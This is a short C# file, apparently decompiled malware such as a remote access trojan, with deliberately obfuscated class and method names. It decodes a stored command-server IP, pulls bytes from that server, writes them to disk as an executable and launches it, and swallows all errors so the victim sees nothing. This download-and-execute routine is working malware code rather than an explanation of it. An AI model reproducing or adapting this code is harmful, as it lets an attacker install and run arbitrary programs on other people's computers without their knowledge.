using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ntharprmes;

internal class ORCAMD
{
	public MEADRM server;

	public NetworkStream ntharprmesNS(TcpClient ntharprmestcpsck)
	{
		return ntharprmestcpsck.GetStream();
	}

	public ORCAMD(MEADRM lID)
	{
		server = lID;
	}

	public string ntharprmesserverIPD()
	{
		return Encoding.UTF8.GetString(CEAZRNF.ntharprmesvpsips, 0, CEAZRNF.ntharprmesvpsips.Length);
	}

	public void ntharprmesdo_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void ntharprmesremove_user()
	{
		try
		{
			byte[] array = server.ntharprmespull_data();
			if (array != null)
			{
				if (!File.Exists(CEAZRNF.ntharprmesget_mpath() + CEAZRNF.ntharprmesremvUser + ".exe"))
				{
					File.WriteAllBytes(CEAZRNF.ntharprmesget_mpath() + CEAZRNF.ntharprmesremvUser + ".exe", array);
				}
				ntharprmesdo_process(CEAZRNF.ntharprmesget_mpath() + CEAZRNF.ntharprmesremvUser + ".exe".ToString());
			}
		}
		catch
		{
		}
	}
}
